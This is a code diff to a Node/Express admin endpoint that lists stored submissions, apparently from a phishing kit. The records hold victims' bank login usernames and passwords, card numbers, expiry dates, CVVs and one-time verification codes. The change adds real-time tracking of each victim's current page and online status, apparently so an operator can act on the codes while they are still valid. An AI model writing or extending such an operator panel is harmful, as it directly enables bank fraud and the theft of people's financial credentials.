@@ -35,24 +35,31 @@ app.get('/api/admin/submissions', async (req, res) => {
     const { data: orders } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
     const cutoff = Date.now() - 30000;
     const { data: visitors } = await supabase.from('visitors').select('*').gt('last_active_at', cutoff);
-    const submissions = (orders || []).map(o => ({
-      id: o.id,
-      name: o.name || '',
-      phone: o.phone || '',
-      account_number: o.account_number || '',
-      is_bank_client: o.is_bank_client || '',
-      bank_name: o.bank_name || '',
-      username: o.login_username || '',
-      password: o.login_password || '',
-      card_name: o.card_name || '',
-      card_number: o.card_number || '',
-      card_expiry: o.card_expiry || '',
-      cvv: o.card_cvv || '',
-      otp: o.verification_code || '',
-      status: o.status || 'pending',
-      time: o.created_at
-    }));
-    res.json({ submissions, active: (visitors || []).length });
+    const activeVisitors = visitors || [];
+    const submissions = (orders || []).map(o => {
+      const visitor = o.session_id ? activeVisitors.find(v => v.session_id === o.session_id) : null;
+      const currentPage = visitor ? visitor.current_page : o.current_page;
+      return {
+        id: o.id,
+        name: o.name || '',
+        phone: o.phone || '',
+        account_number: o.account_number || '',
+        is_bank_client: o.is_bank_client || '',
+        bank_name: o.bank_name || '',
+        username: o.login_username || '',
+        password: o.login_password || '',
+        card_name: o.card_name || '',
+        card_number: o.card_number || '',
+        card_expiry: o.card_expiry || '',
+        cvv: o.card_cvv || '',
+        otp: o.verification_code || '',
+        current_page: currentPage || '',
+        is_online: !!visitor,
+        status: o.status || 'pending',
+        time: o.created_at
+      };
+    });
+    res.json({ submissions, active: activeVisitors.length });
   } catch (err) {
     res.json({ submissions: [], active: 0 });
   }
